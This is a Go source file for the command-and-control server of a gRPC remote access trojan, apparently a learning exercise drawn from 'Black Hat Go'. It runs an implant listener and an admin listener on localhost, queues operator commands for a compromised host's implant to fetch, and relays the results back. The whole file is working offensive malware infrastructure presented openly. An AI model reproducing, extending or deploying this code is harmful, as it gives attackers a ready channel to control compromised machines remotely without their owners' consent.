package main

import (
	"context"
	"github.com/rainer37/go-fun/grpc-rat-black-hat-go/grpcapi"
	log "github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"net"
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, out chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work, s.output = work, out
	return s
}

func NewAdminServer(work, out chan *grpcapi.Command) *adminServer {
	a := new(adminServer)
	a.work, a.output = work, out
	return a
}

func (s *implantServer) SendOutputs(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	log.Info("sending cmd: ", result.String())
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	log.Info("running cmd: ", cmd.String())
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	log.Info("got output: ", res.String())
	return res, nil
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			log.Info("work work: ", cmd.String())
			return cmd, nil
		}
	default:
		log.Info("no work bored...")
		return cmd, nil // empty cmd
	}
	return cmd, nil
}

func main()  {
	var opts []grpc.ServerOption
	work, output := make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)

	implantListener, err := net.Listen("tcp", "localhost:4444")
	if err != nil {
		log.Fatalln(err)
	}

	adminListener, err := net.Listen("tcp", "localhost:9000")
	if err != nil {
		log.Fatalln(err)
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
